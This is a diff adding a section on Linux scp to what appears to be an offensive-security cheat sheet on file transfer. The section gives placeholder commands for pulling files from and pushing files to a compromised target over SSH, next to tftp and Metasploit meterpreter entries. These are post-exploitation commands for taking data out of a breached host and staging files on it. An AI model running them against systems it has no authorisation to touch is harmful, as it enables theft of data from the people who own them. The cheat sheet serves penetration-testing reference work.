@@ -297,6 +297,22 @@ explicitly added, during installation.
 tftp -i <SERVERIP> GET <FILENAME>
 ```
 
+###### [Linux] SCP
+
+The Linux `Secuyre Copy` utility can be used to transfer files over SSH and
+can notably be used to retrieve and upload files from a compromised target
+exposing a SSH service.  
+
+```
+# Download remote <FILENAME> from <HOSTNAME | IP>
+scp <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
+scp -i <KEY> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
+
+# Upload <LOCAL_FILENAME> to <HOSTNAME | IP>
+scp <LOCAL_FILENAME> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
+scp -i <KEY> <LOCAL_FILENAME> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
+```
+
 ###### [Linux / Windows] Metasploit meterpreter
 
 The `Metasploit` `meterpreter` commands `download` and `upload` can be used to
